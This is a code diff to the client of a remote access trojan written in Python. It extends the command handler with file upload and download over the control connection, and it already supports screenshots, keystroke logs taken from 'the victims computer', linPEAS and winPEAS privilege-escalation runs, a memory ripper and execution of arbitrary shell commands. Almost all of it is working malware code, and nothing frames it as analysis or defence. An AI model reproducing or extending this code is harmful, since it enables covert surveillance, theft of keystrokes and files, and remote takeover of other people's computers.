@@ -259,55 +259,102 @@ def concatToFile(text,file):
  # FILTER THE COMMANDS RECIVED           
 def filterCommand(command):
     global stop,logs
-    if command == "screenshot":
-        stop = True
-        capture_screen()
-    elif command == "status":
-        send(getStatus())
-    elif command == "system info":
-        send(sysInfo())
+    try:
+        if command == "screenshot":
+            stop = True
+            capture_screen()
+        elif command == "status":
+            send(getStatus())
+        elif command == "system info":
+            send(sysInfo())
+            
+            
+        # LOGS
+        elif command == "logs true":
+            logs = True
+        elif command == "logs false":
+            logs = False
+        elif command == "show logs":
+            send(log)
         
-        
-    # LOGS
-    elif command == "logs true":
-        logs = True
-    elif command == "logs false":
-        logs = False
-    elif command == "show logs":
-        send(log)
+        #LINPEAS
+        elif command == "linpeas":
+            linPEAS(False)
+        elif command == "linpeas force":
+            linPEAS(True)
+            
+        #WINPEAS
+        elif command == "winpeas":
+            winPEAS(False)
+        elif command == "winpeas force":
+            winPEAS(True)
+        #DIRECTORY MOVEMENT
+        elif "cd " in command:
+            changeCurrentPath(command.split(" ")[1])
+        elif command == "pwd":
+            send(currentDir())
+        # DOWNLOAD FILES
+        elif "download-" in command:
+            sendFileByteMode(command.split("-")[1])
+        # UPLOAD FILES 
+        elif "put-" in command:
+            filename = command.split("-")[1]
+            stop = True
+            print(filename)
+            recvFiles(filename)
+        #MEMORY RIPPER    
+        elif command == "memory ripper":
+            ripper()
+        elif "hibernate-" in command:
+            seconds = filterValue("-",command)[1]
+            hibernateProgram(seconds)
     
-    #LINPEAS
-    elif command == "linpeas":
-        linPEAS(False)
-    elif command == "linpeas force":
-        linPEAS(True)
+        # SENDS THE KEYS TO THE SERVER
+        elif command == "get keylogs":
+            sendFileByteMode("keys.txt")
+            # CLEANS THE FILE OVERWRITING IT
+            saveFile("","keys.txt")
+        else:
+            send(execute(dataTemp))
+    except Exception as e:
+        logEvents(e)
+        stop = False
         
-    #WINPEAS
-    elif command == "winpeas":
-        winPEAS(False)
-    elif command == "winpeas force":
-        winPEAS(True)
-    elif "cd " in command:
-        changeCurrentPath(command.split(" ")[1])
-    elif command == "pwd":
-        send(currentDir())
+        
+def recvLen():
+    global conn
+    i = 0
+    while i < 10:  
+        time.sleep(1)
+        try:
+            dat = conn.recv(1024)
+            decoded = dat.decode()
+            if "len-" in decoded:
+                return int(decoded.split("-")[1])
+        except Exception as f:
+            stop = False
+            print(f)
+            
 
-    #MEMORY RIPPER    
-    elif command == "memory ripper":
-        ripper()
-    elif "hibernate-" in command:
-        seconds = filterValue("-",command)[1]
-        hibernateProgram(seconds)
+def recvFiles(filename):
+    global conn, stop
+    try:
+        ln = recvLen()
+        print ("len : " + str(ln))
+        totalRecv = 0
+        if ln != None:
+            with open(filename, "wb") as f:
+                while totalRecv != ln:
+                    data = conn.recv(4096)
+                    f.write(data)
+                    totalRecv += len(data)
+            print("SAVED")
+            stop = False
     
-    # SENDS THE KEYS TO THE SERVER
-    elif command == "get keylogs":
-        sendFileByteMode("keys.txt")
+    except Exception as e:
+        logEvents(e)
+        stop = False 
         
-        # CLEANS THE FILE OVERWRITING IT
-        saveFile("","keys.txt")
-
-    else:
-        send(execute(dataTemp))
 
 # Grabs the keys pressed on the victims computer
 # We use a proccess instead of threads to improve the performance 
@@ -359,7 +406,7 @@ def changeCurrentPath(newPath):
     except Exception as e:
         logEvents(e)
    
-    
+   
 # SENDS A LOCAL FILE TO THE SERVER
 def sendFileByteMode(file):
     global stop
